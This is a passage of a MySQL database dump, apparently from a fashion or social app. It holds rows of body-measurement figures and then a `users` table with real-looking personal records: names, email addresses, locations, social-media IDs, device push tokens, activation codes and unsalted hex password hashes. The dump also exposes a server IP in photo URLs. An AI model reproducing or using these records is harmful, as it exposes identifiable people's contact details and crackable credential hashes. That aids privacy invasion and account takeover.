(75, 83, 0.00, 178.00, 68.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(76, 84, 0.00, 1.80, 75.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(77, 85, 0.00, 178.00, 68.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(78, 86, 0.00, 187.96, 77.11, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(79, 87, 0.00, 190.50, 81.65, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(80, 88, 0.00, 170.20, 59.01, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(81, 89, 0.00, 159.00, 56.70, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(82, 90, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(83, 91, 0.00, 175.26, 83.91, 0.00, 0.00, 0.00, 58.42, 22.86, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(84, 92, 0.00, 175.26, 83.91, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(85, 93, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(86, 94, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(87, 95, 0.00, 178.00, 65.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(88, 96, 0.00, 152.40, 26.76, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(89, 97, 0.00, 178.00, 75.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(90, 98, 0.00, 152.40, 83.91, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(91, 99, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(92, 100, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(93, 101, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(94, 102, 0.00, 160.00, 50.00, 88.90, 71.12, 0.00, 93.98, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 39.37, '0000-00-00 00:00:00'),
(95, 103, 0.00, 168.00, 63.30, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(96, 104, 0.00, 185.00, 100.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(97, 105, 0.00, 177.80, 68.04, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(98, 106, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(99, 107, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(100, 108, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(101, 109, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(102, 110, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(103, 111, 0.00, 175.26, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(104, 112, 0.00, 187.96, 81.65, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(105, 113, 0.00, 175.26, 79.38, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(106, 114, 0.00, 154.90, 47.60, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(107, 115, 0.00, 177.80, 86.20, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(108, 116, 0.00, 177.80, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(109, 117, 0.00, 177.80, 88.45, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(110, 118, 0.00, 373.38, 156.49, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(111, 119, 0.00, 172.00, 75.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(112, 120, 0.00, 177.80, 83.91, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(113, 121, 0.00, 177.80, 83.91, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(114, 122, 0.00, 163.07, 47.60, 80.01, 66.04, 0.00, 91.44, 22.86, 32.26, 39.37, 55.88, 24.13, 38.10, 74.93, 46.99, 86.36, 30.48, '0000-00-00 00:00:00'),
(115, 123, 0.00, 177.80, 81.65, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(116, 124, 0.00, 165.10, 77.11, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(117, 125, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(118, 126, 0.00, 177.00, 86.18, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(119, 127, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(120, 128, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(121, 129, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(122, 130, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(123, 131, 0.00, 177.80, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(124, 132, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(125, 133, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(126, 134, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(127, 135, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(128, 136, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(129, 137, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(130, 138, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(131, 139, 0.00, 172.72, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(132, 140, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(133, 141, 0.00, 180.34, 83.91, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(134, 142, 0.00, 186.00, 64.00, 0.00, 78.80, 0.00, 0.00, 26.50, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '2015-03-22 12:51:43'),
(135, 143, 0.00, 1.84, 76.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(136, 144, 0.00, 182.88, 78.02, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(137, 145, 0.00, 178.00, 75.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(138, 146, 0.00, 187.96, 91.17, 100.33, 99.06, 0.00, 106.68, 27.94, 39.37, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(139, 147, 0.00, 166.00, 52.00, 80.00, 65.00, 0.00, 90.00, 37.00, 30.50, 44.00, 60.50, 26.00, 0.00, 83.50, 47.00, 94.00, 33.00, '2015-03-22 12:41:14'),
(140, 148, 0.00, 184.00, 75.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '2015-03-25 06:39:04'),
(141, 149, 0.00, 166.00, 50.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(142, 150, 0.00, 177.80, 58.97, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(143, 151, 0.00, 181.00, 80.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(144, 152, 0.00, 180.10, 75.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(145, 153, 0.00, 180.34, 95.25, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(146, 154, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(147, 156, 0.00, 173.00, 66.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(148, 157, 0.00, 168.00, 57.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(149, 158, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(150, 159, 0.00, 160.00, 47.00, 0.00, 0.00, 0.00, 0.00, 23.50, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '2015-03-22 13:09:54'),
(151, 160, 0.00, 162.56, 48.08, 83.82, 68.58, 0.00, 91.44, 21.59, 31.75, 35.56, 60.96, 30.48, 60.96, 74.93, 49.53, 87.63, 31.75, '2015-03-22 23:28:55'),
(152, 161, 0.00, 160.00, 75.00, 102.00, 91.00, 0.00, 114.00, 37.00, 35.50, 41.00, 56.00, 32.00, 51.00, 89.00, 66.00, 97.00, 40.00, '2015-03-23 10:43:09'),
(153, 162, 0.00, 159.00, 50.00, 78.00, 86.00, 0.00, 90.00, 24.00, 33.00, 0.00, 0.00, 0.00, 0.00, 73.00, 50.00, 0.00, 32.00, '2015-03-25 18:19:21'),
(154, 163, 0.00, 160.02, 48.99, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(155, 164, 0.00, 157.48, 52.16, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(156, 165, 0.00, 5425.44, 83.46, 106.68, 81.28, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '2015-03-25 01:51:57'),
(157, 166, 0.00, 188.00, 90.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(158, 167, 0.00, 165.00, 61.50, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(159, 168, 0.00, 181.00, 80.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(160, 169, 0.00, 182.00, 77.00, 101.00, 94.00, 0.00, 104.00, 30.00, 38.00, 48.00, 70.00, 31.00, 65.00, 89.00, 53.00, 97.00, 38.00, '2015-03-25 08:48:00'),
(161, 170, 0.00, 1.64, 54.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(162, 171, 0.00, 166.00, 60.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(163, 172, 0.00, 167.00, 63.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(164, 173, 0.00, 164.00, 62.00, 93.00, 71.00, 0.00, 103.00, 24.00, 33.00, 40.01, 76.20, 26.04, 41.91, 78.74, 59.69, 96.52, 39.37, '2015-03-26 17:33:30'),
(165, 174, 0.00, 172.00, 64.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(166, 175, 0.00, 167.64, 113.40, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(167, 176, 0.00, 165.10, 52.62, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(168, 177, 0.00, 182.88, 88.45, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(169, 178, 0.00, 178.00, 70.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(170, 179, 0.00, 176.02, 88.45, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(171, 180, 0.00, 165.10, 58.97, 91.44, 81.28, 0.00, 93.98, 24.13, 31.75, 43.18, 96.52, 33.02, 46.99, 88.90, 52.07, 96.52, 36.83, '2015-03-27 04:54:37'),
(172, 181, 0.00, 160.02, 48.53, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00'),
(173, 182, 0.00, 170.00, 54.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00, '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
`user_id` int(11) unsigned NOT NULL,
  `user_name` varchar(50) DEFAULT '',
  `first_name` varchar(50) DEFAULT '',
  `last_name` varchar(50) DEFAULT '',
  `email_address` varchar(50) DEFAULT '',
  `password` varchar(255) DEFAULT '',
  `gender` varchar(10) DEFAULT '',
  `is_first` tinyint(1) DEFAULT '0',
  `role` int(1) DEFAULT '0',
  `active_code` varchar(100) DEFAULT '',
  `fb_id` varchar(100) DEFAULT '',
  `tw_id` varchar(100) DEFAULT '',
  `location` varchar(255) DEFAULT '',
  `photo_url` varchar(255) DEFAULT '',
  `status` varchar(50) DEFAULT '',
  `created` datetime DEFAULT NULL,
  `device_token` varchar(255) DEFAULT NULL,
  `last_read_time` datetime NOT NULL,
  `notification_read_time` datetime NOT NULL,
  `last_activity` int(10) NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 CHECKSUM=1 DELAY_KEY_WRITE=1 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=183 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`user_id`, `user_name`, `first_name`, `last_name`, `email_address`, `password`, `gender`, `is_first`, `role`, `active_code`, `fb_id`, `tw_id`, `location`, `photo_url`, `status`, `created`, `device_token`, `last_read_time`, `notification_read_time`, `last_activity`) VALUES
(2, 'jinjinru', 'Jin Jin Ru', '', 'jarangde@gmail.com', '7bd1f4608791f8e1a1c953caf8ef97a96715c783', 'male', 0, 0, '', '', '', 'Beijing, China', 'http://54.200.24.75/upload/user/1414508278/52ef250a3c03e1017cfbe233c66cfd07.png', 'funny ', '2014-10-28 14:33:54', '6ecb2834ab0d3ee2b5657ac70fd3562c4fce5cb721e269f81e41b9fdf1000a3f', '2014-11-02 19:09:02', '2014-11-02 19:08:58', 0),
(3, 'leeming', 'Lee Ming', '', 'lee@linkqlo.com', 'e3a87fa50cf8c6d36be2a0776aef1cc18405c6b4', 'male', 0, 0, '', '', '', 'Guangzhou, China', 'http://54.200.24.75/upload/user/1414517876/553f7808ff1b90a234439c0ef6af21ac.png', 'The only thing123', '2014-10-28 16:51:02', '5afd6eaebb639c7d53f421027ef5b50a547c6310cb486bbe382776b6bac9d2d3', '2015-01-18 01:40:52', '2015-01-15 08:53:28', 0),
(4, 'thomasjohn', 'Thomas John', '', 'ilhyang1108@hotmail.com', '', 'male', 1, 0, '317f83dc602414773ece35d8e88360754d2c1142', '711045402315982', '', '', 'https://graph.facebook.com/711045402315982/picture?type=large', '', '2014-10-30 06:48:23', '5afd6eaebb639c7d53f421027ef5b50a547c6310cb486bbe382776b6bac9d2d3', '2014-12-01 14:38:24', '2014-12-01 14:05:58', 0),
(7, 'quinn', 'Kun Yang', '0', 'herbert.yang@gmail.com', '934da2c5ba71a49c10aae67f698c90d08ba30868', 'male', 0, 0, '', '', '', 'Palo Alto, CA', 'http://54.200.24.75/upload/user/1421531840/de837afc1288f26b271325ebda423d71.png', 'getting ready to submit beta app', '2014-11-02 17:29:31', '9adb3aaf70597d8ace5cdaff4d16ca5de3efe9edc5b4d5d0945bd60512c0412b', '2015-03-18 04:04:01', '2015-03-11 14:33:08', 0),
(9, 'yangkun', 'Kun Yang', '', 'herbert@guizishanren.com', 'ac992f3245ddcb3fab970e1b2b7ceeb2f04d9dd1', 'male', 0, 0, 'bc72ab14f9c90553124e43db2455a65ca03398e1', '', '', '', 'http://54.200.24.75/upload/user/1414979261/d603a88f26cd7f7152328bad4f3ded0f.png', '', '2014-11-03 01:18:27', '9adb3aaf70597d8ace5cdaff4d16ca5de3efe9edc5b4d5d0945bd60512c0412b', '2015-03-06 14:35:00', '0000-00-00 00:00:00', 0),
(10, 'herbertyang', 'Herbert', '0', '', '', 'male', 1, 0, '', '', '6863202', 'Palo Alto, CA', 'http://pbs.twimg.com/profile_images/560415188013154304/NCmbYh_A.jpeg', 'let''s roll', '2014-11-03 01:23:37', '07c9f5498b501757d84b67ecc0062726e5b2ed39dce1c4e4f9b1704f600c8bde', '2015-03-29 08:40:02', '2015-03-29 07:12:11', 1427618400),
(11, 'wangming', 'Wang Ming', '', 'wang@linkqlo.com', '8cce134e43185274fbf918087ebf0294665ebf1a', 'male', 0, 0, '', '', '', '', 'http://54.200.24.75/upload/user/1415021262/da080c0b98694bfe06858c2632c387d4.png', '', '2014-11-03 04:19:52', '', '2014-11-03 16:58:25', '2014-11-03 17:00:24', 0),
(12, 'johnsmith', 'john smith', '', 'jarangde@gmail.com', 'd472122970821a76907b4900dfc1a03cab90fa6f', 'male', 0, 0, '', '', '', '', 'http://54.200.24.75/upload/user/1415040637/3f9fbd4089cc742050baece8da3cbba6.png', '', '2014-11-03 18:47:23', '', '2014-11-03 18:52:11', '0000-00-00 00:00:00', 0),
(13, 'ninegua', 'Paul Liu', '', 'paul@thev.net', '0517d5fde8cffcb992096524389a6118092be73f', 'male', 0, 0, 'bca194762ef05baca8e53a76a0d1fb2f8e89bd54', '', '', '', 'http://54.200.24.75/upload/user/1415345373/b0879268a2ecd0b86b7d312b17f0e94c.png', 'Stranger', '2014-11-06 06:57:08', '2a1bfeee45fa7bd8afcf26e79b737ff2ad477fe14fed9aa02e8fb43d0e2db69e', '2015-01-13 06:18:53', '2015-01-15 21:07:03', 0),
(16, 'rei', 'rei rei', '', 'rei@linkqlo.com', 'd49a1db36a22dcc4cf090ac038b95a3ab9e8ebec', 'male', 1, 0, '', '', '', '', 'http://54.200.24.75/upload/user/1415260124/9a9ec5254ed58f0d1ff93bd54aa00014.png', '', '2014-11-06 07:34:46', '', '2014-11-06 07:48:48', '0000-00-00 00:00:00', 0),
(17, 'alee', 'Andrew Lee', '', '', '', 'male', 1, 0, '', '', '150476075', '', 'http://pbs.twimg.com/profile_images/528742124062117888/uLzwVNnw.jpeg', '', '2014-11-10 01:56:59', '6f8e78d16cd35fb115af895fa6ced2c7c272d4ab2b0b69b1e0ab252eeff74bba', '2014-11-10 01:57:07', '2015-01-05 23:13:25', 0),
(18, 'test_black', 'Tw La', '', '', '', '', 1, 0, '', '', '394034601938284737', '', 'http://pokietube.com.au/wp-content/uploads/2014/10/6.png', '', '2014-11-10 06:44:28', '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0),
(19, 'leeilhyang', 'lee ilhyang', '', '', '', 'male', 1, 0, '', '', '2732227554', '', 'http://pbs.twimg.com/profile_images/531692934597341185/Ru6RTtG8.png', '', '2014-11-10 06:53:15', '5afd6eaebb639c7d53f421027ef5b50a547c6310cb486bbe382776b6bac9d2d3', '2015-01-04 02:57:41', '2014-11-27 07:29:20', 0),
(21, 'wildsheepchase', 'Wildsheepchase', '0', 'huiling.huang@gmail.com', 'd472122970821a76907b4900dfc1a03cab90fa6f', 'female', 0, 0, '', '', '', 'Palo Alto, CA', 'http://54.200.24.75/upload/user/1421560295/99cd3e46adde175b4896d52e10bda6ac.png', 'keep running', '2014-11-12 09:10:19', '2d1a20678a64fbce8b78ac86e68d8fbb422617824ac7a1aff6bb36b01b86eea9', '2015-03-29 15:02:55', '2015-03-29 00:43:46', 1427641181),
(22, 'zire', 'Kun Yang', '', 'herbert.yang+linkqko@gmail.com', 'ac992f3245ddcb3fab970e1b2b7ceeb2f04d9dd1', 'male', 1, 0, '', '', '', 'Wuhan, China', 'http://54.200.24.75/upload/user/1415835556/dc6c7ae072c2145a3c5f072548849a4c.png', 'trying again how long this can betrying again how ', '2014-11-12 23:39:16', '07c9f5498b501757d84b67ecc0062726e5b2ed39dce1c4e4f9b1704f600c8bde', '2014-11-12 23:39:45', '0000-00-00 00:00:00', 0),
(23, 'test1', 'test1 Test', '', 'xademong@gmail.com', 'd472122970821a76907b4900dfc1a03cab90fa6f', 'male', 1, 0, '', '', '', '', 'http://54.200.24.75/upload/user/1415870334/c5ea59ebc8fa9f1ca3f74f2d9131cb48.png', '', '2014-11-13 09:18:54', '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0),
(24, 'gyerimcha', 'Gye Rim Cha', '', 'lmc404@gmail.com', '', 'male', 1, 0, '', '10205592856807494', '', '', 'https://graph.facebook.com/10205592856807494/picture?type=large', '', '2014-11-13 21:11:06', '', '2014-11-13 21:37:51', '0000-00-00 00:00:00', 0),
(25, 'test1121212', 'test1 Test', '', 'test221@test.com', 'd472122970821a76907b4900dfc1a03cab90fa6f', 'male', 1, 0, '', '', '', '', 'http://54.200.24.75/upload/user/1415914323/508d30347188c13a667aa6d514efa1e5.png', '', '2014-11-13 21:32:03', '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0),
